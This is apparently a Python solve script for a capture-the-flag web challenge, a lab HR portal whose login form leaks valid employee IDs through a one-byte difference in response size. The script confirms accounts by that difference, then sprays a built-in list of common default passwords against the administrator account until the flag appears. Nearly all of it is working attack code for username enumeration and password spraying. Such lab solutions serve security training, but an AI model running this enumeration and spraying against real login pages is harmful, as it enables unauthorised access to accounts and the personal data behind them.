#!/usr/bin/env python3
"""
PeopleFirst HR (auth, 100) — CWE-204 username enumeration + unchanged default password.

The /login form (field `emp_id`, not `username`) returns a different response
size for a valid vs invalid account:
    invalid emp_id        -> 1105 bytes ("no such user")
    valid emp_id, bad pw  -> 1104 bytes ("wrong password")
The "Meet the team" page gives the ID scheme (first initial + last name), so the
HR Systems Administrator is `pnatarajan`. Its default password was never changed
-> admin123.

Usage:
    python3 solve.py                          # defaults to auth10.chal.deti:8069
    python3 solve.py http://auth10.chal.deti:8069
"""
import re
import sys

import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://auth10.chal.deti:8069"
LOGIN = f"{BASE}/login"

CANDIDATE_IDS = ["pnatarajan", "mebo", "lford"]  # from the team page ID scheme
BOGUS_ID = "zzzznope"
PASSWORDS = [
    "admin123", "Welcome1", "Welcome123", "Password1", "Password123",
    "changeme", "Changeme123", "PeopleFirst1", "default", "admin",
]

FLAG_RE = re.compile(r"flag\{[^}]*\}")


def size(emp_id: str, password: str) -> int:
    r = requests.post(LOGIN, data={"emp_id": emp_id, "password": password}, timeout=10)
    return len(r.content)


def main() -> int:
    # 1. CWE-204: confirm which accounts exist via the response-size discrepancy
    bogus = size(BOGUS_ID, "x")
    print(f"[i] invalid-user baseline: {bogus} bytes")
    valid = [u for u in CANDIDATE_IDS if size(u, "x") != bogus]
    print(f"[+] enumerated valid accounts: {valid}")

    target = "pnatarajan" if "pnatarajan" in valid else (valid[0] if valid else "pnatarajan")

    # 2. spray the unchanged default password; success page carries the flag
    for pw in PASSWORDS:
        r = requests.post(LOGIN, data={"emp_id": target, "password": pw},
                          timeout=10, allow_redirects=True)
        m = FLAG_RE.search(r.text)
        if m:
            print(f"[+] {target}:{pw} -> {m.group(0)}")
            return 0
    print("[-] no default password worked from the built-in list")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
